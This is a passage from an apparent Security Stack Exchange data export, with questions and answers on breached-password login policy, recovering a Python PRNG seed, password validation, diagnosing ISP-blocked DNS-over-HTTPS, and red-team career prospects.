<li><p>Only the most fresh breaches, the ones that did not yet make it to HIBP, would still be useful.</p>
</li>
</ol>
</sup>
","16","4","265285","<p>There is no single right choice, i.e. it depends on the details of your actual use case, as often it is a trade-off between usability and security. Some aspects to consider:</p>
<ul>
<li>If the account is valuable to the user, then the user might actually be thankful for this protection. But in the other case, you might lose a customer, i.e. lost value for you.</li>
<li>If lots of damage might be done with the account it is important to you as a service to protect the account, so blocking the account might be acceptable even if it might mean losing users.</li>
<li>There might be less severe options to fully blocking the account immediately, like limiting what can be done with it. This is more usable for the customer, so you might keep the customer while still protecting them.</li>
<li>Given that passwords are often reused, it might not be safe to trust the user's email for password resets, since the email account might be compromised too. So you might need to employ more secure identity verification, which will result in even less usability for the user.</li>
<li>You might actually be overwhelmed with users contacting your support, so be careful when enabling this protection for all users at once.</li>
<li>Also be very careful on how you communicate to the user the reason for the password reset. It could be easily misinterpreted as a password leak on your side, which would be bad PR for you.</li>
</ul>
<p>There is actual research into this topic, like <a href=""https://itsec.cs.uni-bonn.de/eidi/"" rel=""noreferrer"">this project</a> (sorry, only in German - but there are also some academic papers in English linked). The points above are based on information I got from people involved in this research project.</p>
","19"
"265283","265283","Should one reject login attempts when the correct password is newly added to a password deny list?","<p>Best practices say that when users choose a password (at signup or when changing an existing password), the application should reject that password if it appears on a list of passwords known to be unsafe. For example, <a href=""https://pages.nist.gov/800-63-3/sp800-63b.html#memsecret"" rel=""noreferrer"">NIST Special Publication 800-63</a> from 2017 says the following (emphasis mine):</p>
<blockquote>
<p><strong>When processing requests to establish and change memorized secrets, verifiers SHALL compare the prospective secrets against a list that contains values known to be commonly-used, expected, or compromised.</strong> For example, the list MAY include, but is not limited to:</p>
<ul>
<li><strong>Passwords obtained from previous breach corpuses</strong>.</li>
<li>Dictionary words.</li>
<li>Repetitive or sequential characters (e.g. ‘aaaaaa’, ‘1234abcd’).</li>
<li>Context-specific words, such as the name of the service, the username, and derivatives thereof.</li>
</ul>
<p>If the chosen secret is found in the list, the CSP or verifier SHALL advise the subscriber that they need to select a different secret, SHALL provide the reason for rejection, and SHALL require the subscriber to choose a different value.</p>
</blockquote>
<p>Let's say I implement this using Have I Been Pwned's <a href=""https://haveibeenpwned.com/Passwords"" rel=""noreferrer"">&quot;Pwned Passwords&quot;</a> API.</p>
<p>Now what happens if a password used by one or more of my users appears¹ in a data breach? Obviously, the password should now be considered &quot;definitely unsafe&quot;²: sooner or later, attackers will include that password in credential stuffing or password spraying attacks.</p>
<p>Following the NIST advice, my application would reject entering such a password on a &quot;change password&quot; form (see above: &quot;When processing requests to (...) change memorized secrets, verifiers SHALL (...)&quot;).</p>
<p>However, if nobody was alerted of that particular password being breached (neither me as the application owner nor every user using that password), that alone will not help: Attackers can still use that password until affected users have changed their password. But that may or may not happen. What's worse, for seldomly-used applications, a lot of time may pass until they log in the next time, so simply displaying a warning on login will not shorten the attack window.</p>
<p>Therefore, I believe that my application should reject <strong>login attempts</strong> which use a breached password:</p>
<ul>
<li>That way, an affected account would effectively be locked from the moment its password appears in a breach corpus. As no attacker could gain access, breach corpus passwords become useless to attackers.³</li>
<li>The application would reject the login attempt with the same reaction (visible message and API response) as if the wrong password was used. This avoids giving the attacker the potentially useful information that this username/password could be used elsewhere.</li>
<li>When a login attempt is rejected due to this, the application could send an email to the account owner informing them of the situation and asking them to use &quot;reset password&quot; functionality. The email would be sent asynchronously to minimize the risk of timing-based information leakage.</li>
<li>To avoid repeated emails, the application would also set an appropriate flag on the account.</li>
</ul>
<h4>What I tried</h4>
<p>I could not find any mention of <em>rejecting login attempts</em> related to breach corpuses. I thought about whether the word &quot;establish&quot; in the NIST guideline could mean &quot;login&quot;, but I doubt that as the rest of that section would not really fit that interpretation.</p>
<blockquote>
<p>When processing requests to <strong>establish</strong> and change memorized secrets, verifiers SHALL compare the prospective secrets (...)</p>
</blockquote>
<h4>Questions</h4>
<ol>
<li>Is there any official/established/popular advice on the topic of rejecting <em>login attempts</em> due to passwords occuring in breach corpuses (as opposed to rejecting <em>password change attempts</em>)?</li>
<li>Is such an approach advisable in general?</li>
<li>Does this (my approach outlined above or the general idea) have any drawbacks or caveats one should consider?</li>
</ol>
<h4>Footnotes</h4>
<sup>
<ol>
<li><p>For this, it doesn't matter whether it was indeed <em>my user's</em> data or <em>someone else's</em> data that appeared in the breach.</p>
</li>
<li><p>I am aware that just because a password <em>does not</em> appear on breach corpuses, it does not mean it should be considered <em>safe</em>.</p>
</li>
<li><p>Only the most fresh breaches, the ones that did not yet make it to HIBP, would still be useful.</p>
</li>
</ol>
</sup>
","16","4","265295","<p>I would advocate against rejecting the login attempt. That would be giving the wrong signal to the user.</p>
<p>Much better to communicate it without disabling their account. But <em>do</em> add a banner with information for the user. With a link to explain what you found and what that means.</p>
<p>Basically we want to give the users the feeling we are there to protect them… and not there to make them do things we want.</p>
","6"
"265283","265283","Should one reject login attempts when the correct password is newly added to a password deny list?","<p>Best practices say that when users choose a password (at signup or when changing an existing password), the application should reject that password if it appears on a list of passwords known to be unsafe. For example, <a href=""https://pages.nist.gov/800-63-3/sp800-63b.html#memsecret"" rel=""noreferrer"">NIST Special Publication 800-63</a> from 2017 says the following (emphasis mine):</p>
<blockquote>
<p><strong>When processing requests to establish and change memorized secrets, verifiers SHALL compare the prospective secrets against a list that contains values known to be commonly-used, expected, or compromised.</strong> For example, the list MAY include, but is not limited to:</p>
<ul>
<li><strong>Passwords obtained from previous breach corpuses</strong>.</li>
<li>Dictionary words.</li>
<li>Repetitive or sequential characters (e.g. ‘aaaaaa’, ‘1234abcd’).</li>
<li>Context-specific words, such as the name of the service, the username, and derivatives thereof.</li>
</ul>
<p>If the chosen secret is found in the list, the CSP or verifier SHALL advise the subscriber that they need to select a different secret, SHALL provide the reason for rejection, and SHALL require the subscriber to choose a different value.</p>
</blockquote>
<p>Let's say I implement this using Have I Been Pwned's <a href=""https://haveibeenpwned.com/Passwords"" rel=""noreferrer"">&quot;Pwned Passwords&quot;</a> API.</p>
<p>Now what happens if a password used by one or more of my users appears¹ in a data breach? Obviously, the password should now be considered &quot;definitely unsafe&quot;²: sooner or later, attackers will include that password in credential stuffing or password spraying attacks.</p>
<p>Following the NIST advice, my application would reject entering such a password on a &quot;change password&quot; form (see above: &quot;When processing requests to (...) change memorized secrets, verifiers SHALL (...)&quot;).</p>
<p>However, if nobody was alerted of that particular password being breached (neither me as the application owner nor every user using that password), that alone will not help: Attackers can still use that password until affected users have changed their password. But that may or may not happen. What's worse, for seldomly-used applications, a lot of time may pass until they log in the next time, so simply displaying a warning on login will not shorten the attack window.</p>
<p>Therefore, I believe that my application should reject <strong>login attempts</strong> which use a breached password:</p>
<ul>
<li>That way, an affected account would effectively be locked from the moment its password appears in a breach corpus. As no attacker could gain access, breach corpus passwords become useless to attackers.³</li>
<li>The application would reject the login attempt with the same reaction (visible message and API response) as if the wrong password was used. This avoids giving the attacker the potentially useful information that this username/password could be used elsewhere.</li>
<li>When a login attempt is rejected due to this, the application could send an email to the account owner informing them of the situation and asking them to use &quot;reset password&quot; functionality. The email would be sent asynchronously to minimize the risk of timing-based information leakage.</li>
<li>To avoid repeated emails, the application would also set an appropriate flag on the account.</li>
</ul>
<h4>What I tried</h4>
<p>I could not find any mention of <em>rejecting login attempts</em> related to breach corpuses. I thought about whether the word &quot;establish&quot; in the NIST guideline could mean &quot;login&quot;, but I doubt that as the rest of that section would not really fit that interpretation.</p>
<blockquote>
<p>When processing requests to <strong>establish</strong> and change memorized secrets, verifiers SHALL compare the prospective secrets (...)</p>
</blockquote>
<h4>Questions</h4>
<ol>
<li>Is there any official/established/popular advice on the topic of rejecting <em>login attempts</em> due to passwords occuring in breach corpuses (as opposed to rejecting <em>password change attempts</em>)?</li>
<li>Is such an approach advisable in general?</li>
<li>Does this (my approach outlined above or the general idea) have any drawbacks or caveats one should consider?</li>
</ol>
<h4>Footnotes</h4>
<sup>
<ol>
<li><p>For this, it doesn't matter whether it was indeed <em>my user's</em> data or <em>someone else's</em> data that appeared in the breach.</p>
</li>
<li><p>I am aware that just because a password <em>does not</em> appear on breach corpuses, it does not mean it should be considered <em>safe</em>.</p>
</li>
<li><p>Only the most fresh breaches, the ones that did not yet make it to HIBP, would still be useful.</p>
</li>
</ol>
</sup>
","16","4","265299","<p>What is your threat model - how much damage can be done with a compromised account?</p>
<p>The best option, if you do have an additional/stronger authentication method, like 2FA or biometric, is to suspend high-impact operations until the user reauthenticates with said stronger method.</p>
<p>For an app that can do financial damage to the user, this should already be built-in. For apps that combine financial and non-financial services, it's good practice to have two levels of authentication, for read-only access and for transactions.</p>
<p>As a general rule, <em>for anything unimportant enough to only be protected by a password</em>, denying access in the event of a weakened password is not normal practice. This is driven by the same usability considerations that have led to the decision to rely on weak authentication (password only) in the first place.</p>
<p>For anything important, your 2FA should be a stronger temporary protection than email-based password reset, as the second factor is more independent than email and site password.</p>
<p>For very high security scenarios, you may want to make use of this marginal bit of security, the hope that the email is safe. But 3FA (like third-party biometric verification) is a stronger security guarantee still, so again makes the extra security from the email password insignificant.</p>
","10"
"265283","265283","Should one reject login attempts when the correct password is newly added to a password deny list?","<p>Best practices say that when users choose a password (at signup or when changing an existing password), the application should reject that password if it appears on a list of passwords known to be unsafe. For example, <a href=""https://pages.nist.gov/800-63-3/sp800-63b.html#memsecret"" rel=""noreferrer"">NIST Special Publication 800-63</a> from 2017 says the following (emphasis mine):</p>
<blockquote>
<p><strong>When processing requests to establish and change memorized secrets, verifiers SHALL compare the prospective secrets against a list that contains values known to be commonly-used, expected, or compromised.</strong> For example, the list MAY include, but is not limited to:</p>
<ul>
<li><strong>Passwords obtained from previous breach corpuses</strong>.</li>
<li>Dictionary words.</li>
<li>Repetitive or sequential characters (e.g. ‘aaaaaa’, ‘1234abcd’).</li>
<li>Context-specific words, such as the name of the service, the username, and derivatives thereof.</li>
</ul>
<p>If the chosen secret is found in the list, the CSP or verifier SHALL advise the subscriber that they need to select a different secret, SHALL provide the reason for rejection, and SHALL require the subscriber to choose a different value.</p>
</blockquote>
<p>Let's say I implement this using Have I Been Pwned's <a href=""https://haveibeenpwned.com/Passwords"" rel=""noreferrer"">&quot;Pwned Passwords&quot;</a> API.</p>
<p>Now what happens if a password used by one or more of my users appears¹ in a data breach? Obviously, the password should now be considered &quot;definitely unsafe&quot;²: sooner or later, attackers will include that password in credential stuffing or password spraying attacks.</p>
<p>Following the NIST advice, my application would reject entering such a password on a &quot;change password&quot; form (see above: &quot;When processing requests to (...) change memorized secrets, verifiers SHALL (...)&quot;).</p>
<p>However, if nobody was alerted of that particular password being breached (neither me as the application owner nor every user using that password), that alone will not help: Attackers can still use that password until affected users have changed their password. But that may or may not happen. What's worse, for seldomly-used applications, a lot of time may pass until they log in the next time, so simply displaying a warning on login will not shorten the attack window.</p>
<p>Therefore, I believe that my application should reject <strong>login attempts</strong> which use a breached password:</p>
<ul>
<li>That way, an affected account would effectively be locked from the moment its password appears in a breach corpus. As no attacker could gain access, breach corpus passwords become useless to attackers.³</li>
<li>The application would reject the login attempt with the same reaction (visible message and API response) as if the wrong password was used. This avoids giving the attacker the potentially useful information that this username/password could be used elsewhere.</li>
<li>When a login attempt is rejected due to this, the application could send an email to the account owner informing them of the situation and asking them to use &quot;reset password&quot; functionality. The email would be sent asynchronously to minimize the risk of timing-based information leakage.</li>
<li>To avoid repeated emails, the application would also set an appropriate flag on the account.</li>
</ul>
<h4>What I tried</h4>
<p>I could not find any mention of <em>rejecting login attempts</em> related to breach corpuses. I thought about whether the word &quot;establish&quot; in the NIST guideline could mean &quot;login&quot;, but I doubt that as the rest of that section would not really fit that interpretation.</p>
<blockquote>
<p>When processing requests to <strong>establish</strong> and change memorized secrets, verifiers SHALL compare the prospective secrets (...)</p>
</blockquote>
<h4>Questions</h4>
<ol>
<li>Is there any official/established/popular advice on the topic of rejecting <em>login attempts</em> due to passwords occuring in breach corpuses (as opposed to rejecting <em>password change attempts</em>)?</li>
<li>Is such an approach advisable in general?</li>
<li>Does this (my approach outlined above or the general idea) have any drawbacks or caveats one should consider?</li>
</ol>
<h4>Footnotes</h4>
<sup>
<ol>
<li><p>For this, it doesn't matter whether it was indeed <em>my user's</em> data or <em>someone else's</em> data that appeared in the breach.</p>
</li>
<li><p>I am aware that just because a password <em>does not</em> appear on breach corpuses, it does not mean it should be considered <em>safe</em>.</p>
</li>
<li><p>Only the most fresh breaches, the ones that did not yet make it to HIBP, would still be useful.</p>
</li>
</ol>
</sup>
","16","4","265312","<p>Remember that <strong>availability</strong> is a security requirement. If you are a bank and your security policy prevents a customer from paying his rent, that is a failure of your security policy. Of course there are tradeoffs, but you have to at least consider a hit to availability as something to be avoided. The appropriate balance depends on the risks.</p>
<blockquote>
<p>For this, it doesn't matter whether it was indeed my user's data or someone else's data that appeared in the breach.</p>
</blockquote>
<p>I'd suggest that is actually not true. If it is someone else's data, the response you suggest would almost certainly be disproportionate. There is no reason to expect that an attacker would associate that new, and presumably very rare, leaked password with this account. They'd be more likely to try &quot;Password&quot; or &quot;monkey&quot; just because that has a better expectation of success. Even if they're only trying new leaks, you'd expect to notice them trying many thousands (or, ten and then you block them) of newly leaked passwords before getting close.</p>
<p>On the other hand if the password leak was associated with the individual, none of that works. If the attacker has the password paired with an identity (e.g. an email address) then it goes straight to the top of their attempt list. You couldn't expect any warning shots. As such, locking them out and contacting them out-of-band to verify their identity and reset their authentication is exactly what you would have to do.</p>
<p>If you don't know which case is which, you can make a probabilistic risk argument in favour of treating it as serious. Just remember to count the cost to availability and develop a smooth recovery process.</p>
","3"
"265216","265216","Is it possible to retrieve seed from a few random numbers?","<p>Let's say I have generated 16 integers (between 0 and 128) using Python</p>
<pre><code>from random import seed, randint
seed(1234)
randoms = [randint(0, 128) for _ in range(0, 16)]
</code></pre>
<p>If we have a rough knowledge of the seed (its number of digits for example), is it <em>physically</em> possible to retrieve the seed of the random generation with only those 16 numbers? If so, how much time would it take with an average computer?</p>
","1","3","265217","<p>First note that the <a href=""https://docs.python.org/3/library/random.html"" rel=""nofollow noreferrer"">random generator in Python</a> is explicitly documented as <em>&quot;completely unsuitable for cryptographic purposes&quot;</em>.</p>
<p>It is also documented that it uses <em>&quot;the Mersenne Twister as the core generator. It produces 53-bit precision floats and has a period of 2**19937-1.&quot;</em>. From <a href=""https://stackoverflow.com/questions/49195632/why-do-the-numpy-and-random-modules-give-different-random-numbers-for-the-same-s"">this question</a> it looks like that Python uses MT19937, which is known to be predictable when observing 624 iterations, see als <a href=""https://en.wikipedia.org/wiki/Mersenne_Twister"" rel=""nofollow noreferrer"">Wikipedia</a> about it. There are also programs like <a href=""https://gist.github.com/tejainece/4dd9fb65645745edbcef1cac18f7e695"" rel=""nofollow noreferrer"">this</a> which show how you get the state and predict the next numbers if 624 values are observed.</p>
<p>It is not possible to determine the state from only 16 numbers though, i.e. there would be multiple possible states for this. Knowing the number of digits in the seed would not add sufficient information either.</p>
<p>Since this specific random generator is declared unsuitable for cryptography I recommend to check math.stackexchange.com if you want to get more into the details of this algorithm.</p>
","3"
"265216","265216","Is it possible to retrieve seed from a few random numbers?","<p>Let's say I have generated 16 integers (between 0 and 128) using Python</p>
<pre><code>from random import seed, randint
seed(1234)
randoms = [randint(0, 128) for _ in range(0, 16)]
</code></pre>
<p>If we have a rough knowledge of the seed (its number of digits for example), is it <em>physically</em> possible to retrieve the seed of the random generation with only those 16 numbers? If so, how much time would it take with an average computer?</p>
","1","3","265218","<p>It depends on the PRNG (Psuedo-Random number generator) at play.  Couldn't immediately find what is used at the heart of Python.</p>
<p>PRNG is just a bit of math on a (hopefully) unpredictable value often chained forward to produce new random numbers on each subsequent call.  There have been many PRNG algorithms, a few we know how to reverse.</p>
<p>The only algorithms where the seed (should) be unrecoverable are CSPRNG (Cryptographically Secure PRNG).  These roughly take the seed and encrypt/permute it with an irreversible (without knowledge of the key) cryptographic operation (AES, Chacha, etc).  Unless the underlying cryptographic alogrithm is broken, it is assumed the seed cannot be found.</p>
","0"
"265216","265216","Is it possible to retrieve seed from a few random numbers?","<p>Let's say I have generated 16 integers (between 0 and 128) using Python</p>
<pre><code>from random import seed, randint
seed(1234)
randoms = [randint(0, 128) for _ in range(0, 16)]
</code></pre>
<p>If we have a rough knowledge of the seed (its number of digits for example), is it <em>physically</em> possible to retrieve the seed of the random generation with only those 16 numbers? If so, how much time would it take with an average computer?</p>
","1","3","265221","<p>See the links below for some interesting reading on how the seed of javascript's Math.random() 'random' number generator can be cracked, with just a few samples:</p>
<p><a href=""https://security.stackexchange.com/questions/84906/predicting-math-random-numbers"">Predicting Math.random() numbers?</a></p>
<p><a href=""https://security.stackexchange.com/questions/181580/why-is-math-random-not-designed-to-be-cryptographically-secure"">Why is Math.random() not designed to be cryptographically secure?</a></p>
","0"
"265161","265161","Should password strength validation also be run server-side or only client-side?","<p>Personally, I think that it's not so important to check the strength of the passwords on server-side, since, if the user evades the validation on the client side, it would be their responsibility to use an insecure password; however, I don't know if this is a correct practice.</p>
","1","3","265162","<p>Really you should validate on both, client side is the more user friendly way of doing it using JavaScript. Although yes it is the users responsibility, it can leave you with issues further down the line as the website/server owner. For example if you have people starting to crack user accounts they can be used for spam or spreading malware etc to other users or even administrators.</p>
","0"
"265161","265161","Should password strength validation also be run server-side or only client-side?","<p>Personally, I think that it's not so important to check the strength of the passwords on server-side, since, if the user evades the validation on the client side, it would be their responsibility to use an insecure password; however, I don't know if this is a correct practice.</p>
","1","3","265163","<blockquote>
<p>... if the user evades the validation on the client side, it would be their responsibility to use an insecure password ...</p>
</blockquote>
<p>I follow this argument somewhat if only the users data itself are at risk or if the user is fully liable for any damage done if something goes wrong. But this is rarely the case.</p>
<p>It is clearly not the case in companies, since here are company data at risk and usually the user has also limited liability. But even with personal mail accounts the problem is already visible: there is a reputation and trust connected with a specific mail address and this can be misused with a compromised account for example in supply chain attacks.</p>
<p>Thus, I'm not accepting that one should not enforce good password hygiene and just leave it to the user, since in most cases the user can not be taken fully responsible and liable for any damage done due to weak passwords.</p>
","2"
"265161","265161","Should password strength validation also be run server-side or only client-side?","<p>Personally, I think that it's not so important to check the strength of the passwords on server-side, since, if the user evades the validation on the client side, it would be their responsibility to use an insecure password; however, I don't know if this is a correct practice.</p>
","1","3","265167","<p><strong>Check both so you don't waste server or network resources and you're legally covered.</strong></p>
<p>Anything done client-side is just a filter to preserve resources. Repeat it on the server. There's no sense in sending a password that doesn't meet your complexity requirements. All it does it increase the user's potential exposure (e.g. perhaps they recycle passwords. You neither need nor want to see their insecure universal password).</p>
<p>Servers can add some stronger tests, like checking against the <a href=""https://haveibeenpwned.com/Passwords"" rel=""nofollow noreferrer"">Have I Been Pwned database</a>.</p>
<p>If you're vetting entirely client-side and they bypass the protections, there may be unsavory legal consequences after a breach (though I'm not a lawyer and this isn't the right place for such advice).</p>
","1"
"265128","265128","How can I overcome my ISP's DNS redirection when DoH is blocked?","<p>This is a follow-up to my <a href=""https://security.stackexchange.com/questions/265125/can-your-isp-pull-off-a-man-in-the-middle-attack-over-unencrypted-dns"">previous question</a>.</p>
<p>My ISP is apparently trying to redirect my DNS requests. When I visit some sites, my traffic is redirected to other IPs and not the intended site.</p>
<p>I tried DoH, but my ISP blocks DoH.</p>
<p>And even when I set my primary and alternative DNS to 8.8.8.8 and 8.8.4.4, it does not help and I get redirected.</p>
<p>So, as a client of this ISP, besides changing my ISP or using a VPN, because the ISP blocks VPNs, what other methods can I use to overcome their redirection of my DNS requests?</p>
","2","3","265144","<p>Judging from the question <strong>and</strong> the comments, it seems you <strong>are</strong> definitely stuck, perhaps <em>ultimately</em>.</p>
<p>Judging from the question, it seems your ISP is active at preventing you from using your own DNS.</p>
<p>DoH is not easy to detect, as it implies establishing an <code>https</code> session to an IP address. Your ISP may only know a list of major DoH providers (which are blocked at rules level) or perform MiTM to block DoH queries.</p>
<p>Final options, that go into the scope of VPNs, include SSH bridging to a VPS and Tor.</p>
<p><strong>But your ISP may be, or become, active at blocking them.</strong></p>
","2"
"265128","265128","How can I overcome my ISP's DNS redirection when DoH is blocked?","<p>This is a follow-up to my <a href=""https://security.stackexchange.com/questions/265125/can-your-isp-pull-off-a-man-in-the-middle-attack-over-unencrypted-dns"">previous question</a>.</p>
<p>My ISP is apparently trying to redirect my DNS requests. When I visit some sites, my traffic is redirected to other IPs and not the intended site.</p>
<p>I tried DoH, but my ISP blocks DoH.</p>
<p>And even when I set my primary and alternative DNS to 8.8.8.8 and 8.8.4.4, it does not help and I get redirected.</p>
<p>So, as a client of this ISP, besides changing my ISP or using a VPN, because the ISP blocks VPNs, what other methods can I use to overcome their redirection of my DNS requests?</p>
","2","3","265151","<h2>Warning</h2>
<p>First you, should be aware that DoH does not provide a perfect privacy. If you are worried because some state actor might be monitoring your communications, DoH might not be enough:</p>
<ul>
<li>the host name you are talking to is still sent in plaintext in the TLS SNI field (this might change in the future);</li>
<li>the IP address of the machines you are talking to are still sent in plaintext as well.</li>
</ul>
<p>This might be used to:</p>
<ul>
<li>track the sites you are browsing to or more generally the servers you are communicating with;</li>
<li>block some of them.</li>
</ul>
<p>If you are worried about this, DoH is not enough!</p>
<p>Solutions might include:</p>
<ul>
<li>a SOCKS-over-SSH proxy (with name resolution going through the proxy);</li>
<li>a proper robust trusted VPN;</li>
<li>Torbrowser.</li>
</ul>
<p>See for example <a href=""https://www.bellingcat.com/resources/2022/04/22/how-to-beat-russias-block-on-bellingcat/"" rel=""nofollow noreferrer"">Bellingcat is Banned in Russia. Here’s How to Beat the Block</a> for some consideations in this regard.</p>
<h2>Checking whether and howd is blocked</h2>
<p>The first thing to do is check if DoH is really blocked and how.</p>
<p>I'm going to take <a href=""https://cloudflare-dns.com/dns-query"" rel=""nofollow noreferrer"">https://cloudflare-dns.com/dns-query</a> in this example.</p>
<p>For me it seems to be responding OK:</p>
<pre><code>$ curl --doh-url https://cloudflare-dns.com/dns-query https://www.example.com/
&lt;!doctype html&gt;
&lt;html&gt;
&lt;head&gt;
    &lt;title&gt;Example Domain&lt;/title&gt;
...
</code></pre>
<p>You could try to launch this command. It this fails enabling verbose output might be useful in order to understand what went wrong:</p>
<pre><code>$ curl -vv --doh-url https://cloudflare-dns.com/dns-query https://www.example.com/
</code></pre>
<p>This might be enough to see what went wrong. The following subsections provide some instructions in order to test the different phases.</p>
<h3>Checking (initial) DoH server name resolution</h3>
<p>First, we can try to resolve the address of the DoH server:</p>
<pre><code>$ dig +short cloudflare-dns.com
104.16.248.249
104.16.249.249
</code></pre>
<p>Possibilities:</p>
<ul>
<li>If you do not have any IP address, at this point your initial (unprotected) DNS request for &quot;cloudflare-dns.com&quot; might be blocked.</li>
<li>If you have some answer but this is not the same IP I have, this might be normal (or it might be a spoofed DNS response containing a malicious IP address).</li>
</ul>
<h3>Using the DoH resolver directly</h3>
<p>Now let's try to use use this DoH server in order to resolve <a href=""http://www.example.com"" rel=""nofollow noreferrer"">www.example.com</a>. I'm getting some binary response such as:</p>
<pre><code>$ curl https://cloudflare-dns.com/dns-query?dns=AAABAAABAAAAAAAAA3d3dwdleGFtcGxlA2NvbQAAAQAB -D- -o-
HTTP/2 200 
server: cloudflare
date: Fri, 30 Sep 2022 15:19:33 GMT
content-type: application/dns-message
access-control-allow-origin: *
content-length: 49
cf-ray: 752defff4c52d4f6-CDG

��wwwexamplecom�
                ?�]��&quot;
</code></pre>
<p>Alternatively, you can try to resolve this URL directly from your browser.</p>
<p>If something went wrong, you might want to use the verbose mode (<code>curl -v</code>, <code>curl -vv</code>) in order to have more information.</p>
<p>Possibilities:</p>
<ul>
<li>you cannot establish a connection to this server at the TCP layer, this might mean that you are blocked at the IP/TCP layer;</li>
<li>you have some TLS error (bad certificate, etc.), this might mean that someone is attempting a man-in-the-middle attack on the connection (possibly based on the SNI field);</li>
<li>you get a non 200 answer which might mean there something not working;</li>
<li>you get a 200 answer with some binary data with <code>application/dns-message</code></li>
</ul>
<p>If you received an answer, you can store it to a file with:</p>
<pre><code>$ curl https://cloudflare-dns.com/dns-query?dns=AAABAAABAAAAAAAAA3d3dwdleGFtcGxlA2NvbQAAAQAB -o answer.dns
</code></pre>
<p>And now you can parse it with Scapy:</p>
<pre><code>$ python3 -c 'import scapy.layers.dns; print(repr(scapy.layers.dns.DNS(open(&quot;answer.dns&quot;, &quot;rb&quot;).read())))'
&lt;DNS  id=0 qr=1 opcode=QUERY aa=0 tc=0 rd=1 ra=1 z=0 ad=0 cd=0 rcode=ok qdcount=1 ancount=1 nscount=0 arcount=0 qd=&lt;DNSQR  qname='www.example.com.' qtype=A qclass=IN |&gt; an=&lt;DNSRR  rrname='www.example.com.' type=A rclass=IN ttl=76059 rdlen=None rdata=93.184.216.34 |&gt; ns=None ar=None |&gt;
</code></pre>
<p>The <code>an</code> section lists the different ANSWERS I got in the DNS response:
I got the address 93.184.216.34 which is the IP address of <a href=""http://www.example.com"" rel=""nofollow noreferrer"">www.example.com</a>.</p>
<p>Possibilities:</p>
<ul>
<li>you might get an incorrect answer, this might mean that an attacker has managed to successfully man-in-the-middle your communication with the DoH server (which means that your machine is somehow compromised);</li>
<li>you might get the correct answer.</li>
</ul>
<h2>Mitigations</h2>
<p>If the DoH provider is blocked at the (initial) name resolution step, you could add a static entry in your <code>hosts</code> file in order to statically associate its host name with its IP address.</p>
<p>...</p>
","1"
"265128","265128","How can I overcome my ISP's DNS redirection when DoH is blocked?","<p>This is a follow-up to my <a href=""https://security.stackexchange.com/questions/265125/can-your-isp-pull-off-a-man-in-the-middle-attack-over-unencrypted-dns"">previous question</a>.</p>
<p>My ISP is apparently trying to redirect my DNS requests. When I visit some sites, my traffic is redirected to other IPs and not the intended site.</p>
<p>I tried DoH, but my ISP blocks DoH.</p>
<p>And even when I set my primary and alternative DNS to 8.8.8.8 and 8.8.4.4, it does not help and I get redirected.</p>
<p>So, as a client of this ISP, besides changing my ISP or using a VPN, because the ISP blocks VPNs, what other methods can I use to overcome their redirection of my DNS requests?</p>
","2","3","265190","<p>To address the actual question (the other answers about how it shouldn't be easy for an ISP to block DoH completely are also relevant):</p>
<p>You tunnel DNS through another protocol. A simple example would be a VPN like using a openvpn Tunnel to some other host and routing the traffic to a DNS server of your choice through the tunnel.</p>
<p>If you don't have someone who can help you (you only need access to DNS, which is very low traffic), you can rent a cheap VPS. Or for a complete solution you could pay one of the many privacy VPN services, which allow to tunnel all your traffic.</p>
<p>These choices, of course, imply that the corresponding tunnel protocols aren't also blocked.</p>
<p>For some, you should also be able to tunnel them through HTTPS or at least port 443. There are even tools to make the webserver decide if the traffic is forwarded to another service like a VPN program or answered by the server depending on the content of the incoming request. The details may be worth another question here.</p>
","1"
"265088","265088","Job prospects for Red Teaming in cloud security?","<p>I want to make my career in cyber security, but am confused which field to choose. According to this Burning Glass report,</p>
<p><a href=""https://www.burning-glass.com/wp-content/uploads/2020/10/Fastest_Growing_Cybersecurity_Skills_Report.pdf"" rel=""nofollow noreferrer"">https://www.burning-glass.com/wp-content/uploads/2020/10/Fastest_Growing_Cybersecurity_Skills_Report.pdf</a></p>
<p>Cloud security is 2nd most demanded field with least supply. <em>I don't care about Application security because I hate coding.</em> The report doesn't contain any information about red team, but I have strong interest in this field. Can anyone tell <strong>its demand and supply with comparison to cloud security?</strong></p>
","1","3","265091","<p>From what I've seen, there's enough demand in any infosec field for you to find a job in the specialty you want. But that depends on where you want to live and the kind of businesses that are around.</p>
<p>If you do not like coding, you might dislike cloud security even more.</p>
<p>At my workplace (a infosec audit and consultancy company), most of the new applicants want to do red team or pentesting, because that's what appears to be the most fun. However, demand in red teaming is pretty low, so low it does not even appear in the report you cite. Pentesting can be integrated into more general audits (web, app, infrastructure) and the skills can be useful in incident response.</p>
<p>When we recruit, the most important &quot;skill&quot; we look for is curiosity. Because the technical skill level out of school is so low, it does not really matter. What is important (for us) is how fast you will learn the trade while on the job. Keep in mind that half the trade is composed of social skills (writing reports, interacting with clients). Our pentesters only spend about 10% to 20% of their time actually performing pentests.</p>
<p>If, however, you want to work in a company developing products or services, things will be different. I think the report you cite match more those profiles. But you might as well forget red teaming, because the only positions available in the companies looking for internal red teams will not be for juniors.</p>
<p>Anyway, that's only from my point of view (too long for a comment), YMMV.</p>
","1"
"265088","265088","Job prospects for Red Teaming in cloud security?","<p>I want to make my career in cyber security, but am confused which field to choose. According to this Burning Glass report,</p>
<p><a href=""https://www.burning-glass.com/wp-content/uploads/2020/10/Fastest_Growing_Cybersecurity_Skills_Report.pdf"" rel=""nofollow noreferrer"">https://www.burning-glass.com/wp-content/uploads/2020/10/Fastest_Growing_Cybersecurity_Skills_Report.pdf</a></p>
<p>Cloud security is 2nd most demanded field with least supply. <em>I don't care about Application security because I hate coding.</em> The report doesn't contain any information about red team, but I have strong interest in this field. Can anyone tell <strong>its demand and supply with comparison to cloud security?</strong></p>
","1","3","265095","<p>Regarding red teaming specifically, in comparison to cloud security there is a lot less demand because very few companies do true red teaming. Most companies use a cloud service in some way so they will need people to secure and analyze this but unless you work for a consultancy or large company most won't employ internal red teamers.</p>
<p>However I have to agree with the others, I'm sorry to say that if you don't like coding I don't think either of these roles will be a good fit for you. (Good) Red teaming involves creating custom command and control payloads to circumvent anti virus and exfiltrate data etc. So you really need to be good at coding, networking and windows/linux API. Cloud security often involves a lot automation so you will need to create and manage scripts.</p>
<p>In general, I really would avoid basing your future job prospects on which has most 'supply &amp; demand' especially when it comes to specifc job titles as opoosed to general field or interests. Because first of all these fields and technologies change quite a bit over the years. The other problem is that to be good you continually need to be learning new techniques and if you are not that passionate about it you will get bored quickly. Also bear in mind that with all these cyber security roles there is a lot of <em>boring stuff</em> as well. You may be a pentester and spend 30% of your time doing technical stuff but the rest you will be writing reports, checking other peoples reports, sitting in meetings with clients and doing presentations, creating documentation etc.</p>
